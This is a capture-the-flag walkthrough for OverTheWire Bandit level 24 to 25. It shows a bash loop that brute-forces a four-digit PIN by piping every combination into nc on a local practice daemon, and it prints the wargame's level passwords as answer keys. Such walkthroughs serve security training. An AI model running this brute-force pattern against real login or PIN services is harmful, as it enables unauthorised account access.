# Bandit Level 24 -> Level 25 #

https://overthewire.org/wargames/bandit/bandit25.html

## SSH Access Details ##
**Username:**  bandit24

**Password:**  VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
#

## Level Goal : ##
>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
>You do not need to create new connections each time

#  
## PROCEDURE : ##

In this task we will perform a very basic form of a *brute-force* attack.  This is an attempt at cracking a password or pin by trying all possible different combinations.  So for example if we need to crack a two-digit code we can try all combinations from `00`, `01`, `02`, all the way up to `99` until we find the right one.  Similarly for a two-character code we can try `aa`, `ab`, `ac`, etc up to `zz`.

Let's start off this task by opening a connection on `localhost` to port `30002` using `nc` and seeing exactly what the service is expecting to receive:

```console
bandit24@bandit:/tmp/myscript$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1111
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 2222
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 3333
Wrong! Please enter the correct pincode. Try again.
```

Now that we know exactly the format the service is expecting, we can either spend hours and hours typing in different pin codes until we find the right one, or else we can write a simple script to make our lives that much easier.

Let's start by creating a directory in `/tmp/` and creating a file called `myscript.sh`, which we can open with `nano` for editing.

```console
bandit24@bandit:/tmp/myscript$ mkdir /tmp/scriptdir
bandit24@bandit:/tmp/myscript$ cd /tmp/scriptdir
bandit24@bandit:/tmp/scriptdir$ touch myscript.sh
bandit24@bandit:/tmp/scriptdir$ nano myscript.sh
```

For the time being let's just try a quick proof-of-concept.  The following code should generate 100 different four-digit PIN codes from 0000 to 0099:

```bash
#!/bin/bash

for i in {0000..0099};
do
  echo $i
done
```

After saving we need to give the script executable permessions:

```console
bandit24@bandit:/tmp/scriptdir$ chmod 777 myscript.sh
```

..and we can now run the script to see what happens:
```console
bandit24@bandit:/tmp/scriptdir$ ./myscript.sh
0000
0001
0002
0003
0004
0005
0006
0007
0008
0009
0010
0011
0012
...
```

OK - that looks great.  We have a qway of very quickly and easily generating all the possible 4-digit PIN combinations.  We just need to edit the range in the for loop to go from `0000` to `9999` and add the current user password before passing on everything to the `nc` connection.

```bash
#!/bin/bash
for i in {0000..9999};
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar " $i;
done | nc localhost 30002
```
Here is a line-by-line explanation of this script:

- `#!/bin/bash`: declares this file as a bash script
- `for i in {0000..9999};`: starts a for loop that starts 0000 and ends at 9999 incrementing the numbers by one for each execution of the loop.  The value of the current iteration (i.e. `0000`, `0001`, `0002`, etc...) is stored in the variable `$i`
-   `echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar " $i;`: Output the current user password, followed by a space and the generated PIN
- `done | nc localhost 30002`: Pass the whole string to a `nc` connection on localhost port no. `30002`
  

Now if we try running our script again, we can see several failed attempts in rapid succession, until finally we have a succesful match 😃 - so satisfying!

```
bandit24@bandit:/tmp/scriptdir$ ./myscript.sh
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
...
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```

#
[<<< Previous Task (Level23) ](Level23%20->%20Level24.md)|......................................................................................................| [Next Task (Level25) >>>](Level25%20->%20Level26.md)|
:-|--|-:
